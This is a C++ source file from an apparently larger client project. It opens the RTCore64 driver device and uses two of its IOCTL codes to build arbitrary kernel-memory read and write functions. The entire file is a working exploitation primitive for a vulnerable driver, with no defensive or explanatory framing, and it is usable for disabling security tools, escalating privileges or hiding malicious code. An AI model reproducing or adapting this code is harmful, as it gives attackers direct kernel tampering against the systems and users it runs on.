#include "../client.h"
#include "clrt.h"

typedef struct
{
	QWORD gap1;          // 0x00
	QWORD address;       // 0x08
	DWORD gap2;          // 0x10
	DWORD offset;        // 0x14
	DWORD size;          // 0x18
	DWORD data;          // 0x1C
	uint8_t gap3[16];    // 0x20
} IO_STRUCT ;

static DWORD rt_read_i32(HANDLE driver_handle, QWORD address)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(DWORD);
	if (!DeviceIoControl(driver_handle, 0x80002048, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL))
	{
		return 0;
	}
	return operation.data;
}

static WORD rt_read_i16(HANDLE driver_handle, QWORD address)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(WORD);
	if (!DeviceIoControl(driver_handle, 0x80002048, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL))
	{
		return 0;
	}
	return operation.data & 0xFFFF;
}

static BYTE rt_read_i8(HANDLE driver_handle, QWORD address)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(BYTE);
	if (!DeviceIoControl(driver_handle, 0x80002048, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL))
	{
		return 0;
	}
	return operation.data & 0xFF;
}

BOOL rt_write_i8(HANDLE driver_handle, QWORD address, BYTE value)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(value);
	operation.data = value;
	return DeviceIoControl(driver_handle, 0x8000204C, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL);
}

BOOL rt_write_i16(HANDLE driver_handle, QWORD address, WORD value)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(value);
	operation.data = value;
	return DeviceIoControl(driver_handle, 0x8000204C, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL);
}

BOOL rt_write_i32(HANDLE driver_handle, QWORD address, DWORD value)
{
	IO_STRUCT operation{};
	operation.address = address;
	operation.size = sizeof(value);
	operation.data = value;
	return DeviceIoControl(driver_handle, 0x8000204C, &operation,
		sizeof(operation), &operation, sizeof(operation), NULL, NULL);
}

static BOOL rt_read(HANDLE driver_handle, QWORD address, PVOID buffer, QWORD size)
{
	QWORD offset    = 0;
	QWORD data_left = size;

	while (data_left)
	{
		if (data_left >= 4)
		{
			DWORD data = rt_read_i32(driver_handle, address + offset);
			*(DWORD*)((PBYTE)buffer + offset) = data;
			offset += 4;
		}
		else if (data_left >= 2)
		{
			WORD data = rt_read_i16(driver_handle, address + offset);
			*(WORD*)((PBYTE)buffer + offset) = data;
			offset += 2;
		}
		else
		{
			BYTE data = rt_read_i8(driver_handle, address + offset);
			*(BYTE*)((PBYTE)buffer + offset) = data;
			offset += 1;
		}
		data_left = size - offset;
	}
	return 1;
}

static BOOL rt_write(HANDLE driver_handle, QWORD address, PVOID buffer, QWORD size)
{
	QWORD offset    = 0;
	QWORD data_left = size;

	while (data_left)
	{
		if (data_left >= 4)
		{
			rt_write_i32(driver_handle, address + offset, *(DWORD*)((PBYTE)buffer + offset));
			offset += 4;
		}
		else if (data_left >= 2)
		{
			rt_write_i16(driver_handle, address + offset, *(WORD*)((PBYTE)buffer + offset));
			offset += 2;
		}
		else
		{
			rt_write_i8(driver_handle, address + offset, *(BYTE*)((PBYTE)buffer + offset));
			offset += 1;
		}
		data_left = size - offset;
	}
	return 1;
}

BOOL cl::clrt::initialize(void)
{
	if (driver_handle != 0)
	{
		return 1;
	}

	driver_handle = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (driver_handle == INVALID_HANDLE_VALUE)
	{
		driver_handle = 0;
	}

	return driver_handle != 0;
}

BOOL cl::clrt::read_kernel(QWORD address, PVOID buffer, QWORD length)
{
	return rt_read(driver_handle, address, buffer, length);
}

BOOL cl::clrt::write_kernel(QWORD address, PVOID buffer, QWORD length)
{
	return rt_write(driver_handle, address, buffer, length);
}
